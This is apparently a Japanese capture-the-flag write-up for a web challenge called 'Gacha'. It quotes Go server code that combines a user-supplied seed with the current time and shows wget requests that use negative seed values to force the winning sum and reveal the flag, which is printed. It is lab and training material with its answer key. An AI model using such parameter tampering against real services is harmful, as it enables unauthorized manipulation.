# Gacha:Web:XXXXpts
ガチャを作ったらしいけど, そのseedの使い方間違ってない？  
[http://34.82.49.144:3334/](http://34.82.49.144:3334/)  
[main.go](main.go)  

# Solution
URLにアクセスするとガチャサイト？のようだ。  
複数回wgetしてみる。  
```bash
$ wget -q -O - http://34.82.49.144:3334/
{"flag":"You might not have a luck...","sum":"11843"}
$ wget -q -O - http://34.82.49.144:3334/
{"flag":"You might not have a luck...","sum":"11845"}
$ wget -q -O - http://34.82.49.144:3334/
{"flag":"You might not have a luck...","sum":"11846"}
$ wget -q -O - http://34.82.49.144:3334/
{"flag":"You might not have a luck...","sum":"11848"}
```
秒数が経過するごとにsumが増加しているようだ。  
ソースの以下に注目する。  
```go
~~~
	seed := r.FormValue("seed")
	if len(seed) == 0 {
		seed = "1"
	}
	seedInt, err := strconv.Atoi(seed)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// get current time(HHmmss)
	jst := time.FixedZone("Asia/Tokyo", 9*60*60)
	nowStr := time.Now().In(jst).Format("150405")
	log.Println(nowStr)
	nowInt, err := strconv.Atoi(nowStr)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	sm := (seedInt + nowInt) % 100000
	log.Println(sm)
	var flag map[string]string

	if sm == 1337 {
		flag = map[string]string{
			"flag": "taskctf{this_is_dummy_flag}",
		}
	} else {
		flag = map[string]string{
			"flag": "You might not have a luck...",
			"sum":  strconv.Itoa(sm),
		}
	}
~~~
```
seedが負の数の場合の対応がされていない。  
```bash
$ wget -q -O - http://34.82.49.144:3334/
{"flag":"You might not have a luck...","sum":"12627"}
$ wget -q -O - http://34.82.49.144:3334/?seed=-10000
{"flag":"You might not have a luck...","sum":"2631"}
```
負の数で調整する。  
```bash
$ wget -q -O - http://34.82.49.144:3334/?seed=-10000
{"flag":"You might not have a luck...","sum":"4846"}
$ wget -q -O - http://34.82.49.144:3334/?seed=-13000
{"flag":"You might not have a luck...","sum":"1853"}
$ wget -q -O - http://34.82.49.144:3334/?seed=-13500
{"flag":"You might not have a luck...","sum":"1358"}
$ wget -q -O - http://34.82.49.144:3334/?seed=-13570
{"flag":"You might not have a luck...","sum":"1334"}
$ wget -q -O - http://34.82.49.144:3334/?seed=-13570
{"flag":"taskctf{Y0u_h4ve_4_gre4t_luck}"}
$ wget -q -O - http://34.82.49.144:3334/?seed=-13570
{"flag":"You might not have a luck...","sum":"1339"}
```
flagが表示された。  

## taskctf{Y0u_h4ve_4_gre4t_luck}